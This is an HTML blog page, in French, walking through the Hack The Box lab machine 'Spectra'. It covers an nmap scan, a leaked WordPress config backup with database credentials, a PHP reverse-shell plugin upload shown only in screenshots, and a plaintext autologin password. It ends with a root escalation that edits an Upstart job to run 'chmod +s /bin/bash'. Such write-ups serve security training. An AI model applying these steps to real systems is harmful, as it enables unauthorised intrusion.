@@ -1,0 +1,614 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Spectra &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Spectra - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Spectra">
+    <meta itemprop="description" content="Hack The Box - Spectra - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Spectra">
+    <meta property="og:description" content="Hack The Box - Spectra - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/fr/article/spectra/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/fr/article/spectra/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/fr/article/spectra/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/" class="active">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/fr/article/spectra/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/fr/article/spectra/">
+            Hack The Box - Spectra
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2021-07-07</span>
+            
+        
+
+        
+            
+                <span class="readingTime">6 Min. lecture</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/write-up/">write-up</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/other/">other</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/spectra/spec-fiche.png" alt=""></p>
+<p>Spectra est une <a href="https://app.hackthebox.eu/machines/Spectra">machine</a> facile qui a été déployée sur Hack The Box le samedi 27 février 2021 and crée par <strong>egre55</strong>.</p>
+<h1 id="résumé-rapide">Résumé rapide</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#scan-nmap">Scan Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumération-web">Enumération web</a></li>
+    <li><a href="#première-connexion---nginx">Première connexion - nginx</a></li>
+    <li><a href="#mouvement-latéral---katie">Mouvement Latéral - katie</a></li>
+    <li><a href="#elévation-de-privilèges---root">Elévation de privilèges - root</a></li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="scan-nmap">Scan Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 8.1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|_  <span style="color:#ae81ff">4096</span> 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+80/tcp   open  http             nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+3306/tcp open  mysql            MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+|_ssl-cert: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_ssl-date: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_sslv2: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_tls-alpn: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+|_tls-nextprotoneg: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+8081/tcp open  blackice-icecap?
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Content-Type: text/plain
+|     Date: Sat, <span style="color:#ae81ff">17</span> Apr <span style="color:#ae81ff">2021</span> 17:25:26 GMT
+|     Connection: close
+|     Hello World
+|   HTTPOptions: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Content-Type: text/plain
+|     Date: Sat, <span style="color:#ae81ff">17</span> Apr <span style="color:#ae81ff">2021</span> 17:25:32 GMT
+|     Connection: close
+|_    Hello World
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8081-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/17%Time<span style="color:#f92672">=</span>607B258A%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
+SF:tRequest,71,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nD
+</span><span style="color:#e6db74">SF:ate:\x20Sat,\x2017\x20Apr\x202021\x2017:25:26\x20GMT\r\nConnection:\x20
+</span><span style="color:#e6db74">SF:close\r\n\r\nHello\x20World\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,71,<span style="color:#e6db74">&#34;HTTP/1\.1\x2020
+</span><span style="color:#e6db74">SF:0\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sat,\x2017\x20Apr\x2
+</span><span style="color:#e6db74">SF:02021\x2017:25:26\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\
+</span><span style="color:#e6db74">SF:n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,71,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/p
+</span><span style="color:#e6db74">SF:lain\r\nDate:\x20Sat,\x2017\x20Apr\x202021\x2017:25:32\x20GMT\r\nConnec
+</span><span style="color:#e6db74">SF:tion:\x20close\r\n\r\nHello\x20World\n&#34;</span><span style="color:#f92672">)</span>;
+</code></pre></div><p>On retrouve :</p>
+<ul>
+<li>un service SSH <code>OpenSSH 8.1</code> sur le port <code>22/TCP</code></li>
+<li>un service HTTP <code>nginx 1.17.4</code> sur le port <code>80/HTTP</code></li>
+<li>un service MySQL sur le port <code>3306/TCP</code></li>
+<li>un service blackice/icecap sur le port <code>8081/TCP</code></li>
+</ul>
+<p>Si je me rends sur le site web sous le port <code>80/TCP</code>, on trouve une page avec deux liens <code>Software Issue Tracker</code> et <code>Test</code> avec un message qui nous indique qu&rsquo;en attendant que le service informatique mette en place <a href="https://fr.wikipedia.org/wiki/Jira">Jira</a>, un logiciel de suivi des tickets et des problèmes, on peut le configurer et l&rsquo;utiliser pour le suivi des problèmes. Rien d&rsquo;intéressant dans le code source.</p>
+<p><img src="/img/spectra/spec-site.png" alt=""></p>
+<h2 id="enumération-web">Enumération web</h2>
+<p>Si je clique sur le premier lien, je suis redirigé vers la page <code>http://spectra.htb/main/</code> qui ressemble à une page <code>Wordpress</code> sous la version <code>5.4.2</code>.</p>
+<p>On peut voir un post <code>Hello World</code> qui nous donne un premier utilisateur <code>administrator</code>.</p>
+<p><img src="/img/spectra/spec-wordpress.png" alt=""></p>
+<p>On retrouve une page de login sous <code>http://spectra.htb/main/wp-login.php</code> et je n&rsquo;arrive pas à me connecter en essayant quelques mots de passe basiques comme <code>admin:admin</code>.</p>
+<p><img src="/img/spectra/spec-log.png" alt=""></p>
+<p>Le second lien nous renvoi vers <code>http://spectra.htb/testing/index.php</code> et on retrouve un message <code>Error establishing a database connection</code>.</p>
+<p><img src="/img/spectra/spec-test.png" alt=""></p>
+<p>En tapant ce message dans Google, je trouve ce <a href="https://www.ionos.fr/digitalguide/hebergement/blogs/error-stablishing-database-connection/">lien</a> qui indique :</p>
+<blockquote>
+<p>Les sites Web WordPress se basent largement sur des bases de données, qui à leur tour utilisent le système de gestion de base de données MySQL. Lorsque les internautes naviguent sur votre site WordPress, les commandes PHP demandent les entrées de base de données dont ils ont besoin. Mais si l&rsquo;utilisateur ne peut voir que le message « erreur lors de la connexion à la base de données » s’afficher, cela signifie que la demande d’informations de la base de données n&rsquo;a pas abouti.</p>
+</blockquote>
+<p>Le site est vulnérable au <a href="https://www.acunetix.com/blog/articles/directory-listing-information-disclosure/">directory listing</a> et on peut lire les fichiers en brut. Il n&rsquo;y a pas de fichier <code>robots.txt</code> ni <code>sitemap.xml</code>.</p>
+<p><img src="/img/spectra/spec-dr.png" alt=""></p>
+<p>J&rsquo;ai essayé d&rsquo;afficher le contenu du fichier <code>wp-config.php</code>, mais ça ne fonctionne pas. Mais j&rsquo;ai une réponse pour le fichier <code>wp-config.php.save</code> avec la commande curl et retrouve le contenu de la base de données.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">- ~ curl http://spectra.htb/testing/wp-config.php.save                                                                                                         luks@parrot
+&lt;?php
+/**
+ * The base configuration <span style="color:#66d9ef">for</span> WordPress
+ *
+
+-- snip --
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL database username */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;devtest&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL database password */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;devteam01&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL hostname */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">)</span>;
+</code></pre></div><p>J&rsquo;essaye de me connecter avec le couple <code>devtest:devteam01</code>, mais j&rsquo;obtiens un message d&rsquo;erreur qui correspond à ce qu&rsquo;on a trouvé plus tôt.</p>
+<p><img src="/img/spectra/spec-sqlerror.png" alt=""></p>
+<p>Mais si j&rsquo;essaye de me connecter au site wordpress avec <code>administrator:devteam01</code> ça fonctionne.</p>
+<p><img src="/img/spectra/spec-wordacc.png" alt=""></p>
+<p>Après énumération, on peut voir qu&rsquo;effectivement la base de données fonctionne très mal.</p>
+<p><img src="/img/spectra/spec-bddbug.png" alt=""></p>
+<h2 id="première-connexion---nginx">Première connexion - nginx</h2>
+<p>Pour me connecter, je vais faire trois choses :</p>
+<p>Création du reverse shell PHP (ne pas oublier les headers)</p>
+<p><img src="/img/spectra/spec-revshell.png" alt=""></p>
+<p>Compression au format .zip et upload du plugin Wordpress</p>
+<p><img src="/img/spectra/spec-zip.png" alt=""></p>
+<p><img src="/img/spectra/spec-install.png" alt=""></p>
+<p><img src="/img/spectra/spec-pwn.png" alt=""></p>
+<p>Ouverture d&rsquo;un listener et récupération d&rsquo;un shell en tant qu'<code>nginx</code>.</p>
+<p><img src="/img/spectra/spec-nginx.png" alt=""></p>
+<h2 id="mouvement-latéral---katie">Mouvement Latéral - katie</h2>
+<p>Enumération des utilisateurs avec <code>/etc/passwd</code> :</p>
+<p><img src="/img/spectra/spec-katie.png" alt=""></p>
+<p>On retrouve l&rsquo;utilisatrice <code>katie</code>.</p>
+<p>Après énumération du système de fichiers, je retrouve le fichier <code>autologin.conf.orig</code> dans <code>/opt</code></p>
+<p><img src="/img/spectra/spec-opt.png" alt=""></p>
+<p>Le fichier nous renvoie vers le répertoire <code>/etc/autologin</code> .</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nginx@spectra /opt $ cat autologin.conf.orig 
+<span style="color:#75715e"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
+<span style="color:#75715e"># Use of this source code is governed by a BSD-style license that can be</span>
+<span style="color:#75715e"># found in the LICENSE file.</span>
+description   <span style="color:#e6db74">&#34;Automatic login at boot&#34;</span>
+author        <span style="color:#e6db74">&#34;chromium-os-dev@chromium.org&#34;</span>
+<span style="color:#75715e"># After boot-complete starts, the login prompt is visible and is accepting</span>
+<span style="color:#75715e"># input.</span>
+start on started boot-complete
+script
+  passwd<span style="color:#f92672">=</span>
+  <span style="color:#75715e"># Read password from file. The file may optionally end with a newline.</span>
+  <span style="color:#66d9ef">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin; <span style="color:#66d9ef">do</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -e <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+      passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+      break
+    <span style="color:#66d9ef">fi</span>
+  <span style="color:#66d9ef">done</span>
+  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>passwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+    exit <span style="color:#ae81ff">0</span>
+  <span style="color:#66d9ef">fi</span>
+  <span style="color:#75715e"># Inject keys into the login prompt.</span>
+  <span style="color:#75715e">#</span>
+  <span style="color:#75715e"># For this to work, you must have already created an account on the device.</span>
+  <span style="color:#75715e"># Otherwise, no login prompt appears at boot and the injected keys do the</span>
+  <span style="color:#75715e"># wrong thing.</span>
+  /usr/local/sbin/inject-keys.py -s <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>passwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> -k enter
+</code></pre></div><p>Il y a un fichier <code>passwd</code> qui contient <code>SummerHereWeCome!!</code></p>
+<p><img src="/img/spectra/spec-katie2.png" alt=""></p>
+<p>J&rsquo;essaye de me connecter en SSH avec les creds <code>katie:SummerHereWeCome!!</code>.</p>
+<p><img src="/img/spectra/spec-ssh.png" alt=""></p>
+<p>Ca fonctionne et je peux récupérer le premier flag <code>user.txt</code>.</p>
+<p><img src="/img/spectra/spec-user.png" alt=""></p>
+<h2 id="elévation-de-privilèges---root">Elévation de privilèges - root</h2>
+<p>En faisant sudo -l, on se rend compte que katie peut démarrer des instances en tant que root.</p>
+<p><img src="/img/spectra/spec-initctl.png" alt=""></p>
+<p>La commande <code>id</code>, indique que katie fait partie du groupe <code>developers</code>.</p>
+<p><img src="/img/spectra/spec-group.png" alt=""></p>
+<p>Après quelques recherches sur Google :</p>
+<ul>
+<li><a href="https://linux.die.net/man/8/initctl">Initctl</a></li>
+<li><a href="http://upstart.ubuntu.com/getting-started.html">Upstart</a></li>
+</ul>
+<p><code>initctl</code> permet à un administrateur système de communiquer et d&rsquo;intéragir avec le démon <code>Upstart init</code>.</p>
+<p>Init est le parent de tous les processus du système, il est exécuté par le noyau et est responsable du démarrage de tous les autres processus. Les processus gérés par init sont connus sous le nom de jobs et sont définis par des fichiers dans le répertoire <code>/etc/init</code>.</p>
+<p>Se rendre dans le dossier <code>/etc/init</code> et afficher les fichiers, il y en a beaucoup alors je vais faire un grep pour afficher uniquement ceux qui ont une appartenance au groupe <code>developers</code>.</p>
+<p><img src="/img/spectra/spec-dev.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">katie@spectra /etc/init $ cat test.conf 
+description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
+author      <span style="color:#e6db74">&#34;katie&#34;</span>
+
+start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
+stop on shutdown
+
+script
+
+    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
+    echo $$ &gt; /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+pre-start script
+    echo <span style="color:#e6db74">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    echo <span style="color:#e6db74">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
+end script
+</code></pre></div><p>Arrêter le service test, modifier le fichier <code>test.conf</code> et ajouter entre <code>script</code> et <code>end script</code></p>
+<p><code>chmod +s /bin/bash</code></p>
+<p><img src="/img/spectra/spec-bin.png" alt=""></p>
+<p>Démarrer le service test et exécuter la commande <code>/bin/bash -p</code> pour devenir root.</p>
+<p><img src="/img/spectra/spec-script.png" alt=""></p>
+<p>Récupération du dernier flag <code>root.txt</code>.</p>
+<p><img src="/img/spectra/spec-root.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/web/">web</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/php/">php</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/file-misconfiguration/">file misconfiguration</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/environment-misconfiguration/">environment misconfiguration</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/cms-exploit/">cms exploit</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/article/spectra/">en</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Derniers articles</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/advuln/">Mise en place d&#39;un environnement AD vulnérable</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/fr/categories/"><strong>Catégories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/fr/categories/ctf">Ctf
+                        (27)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/htb">Htb
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/write-up">Write up
+                        (22)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/linux">Linux
+                        (17)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/writeup">Writeup
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Des médias sociaux</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Autres langues</strong>
+                
+                
+                <a href="//luksec.fr/">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/" class="active">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
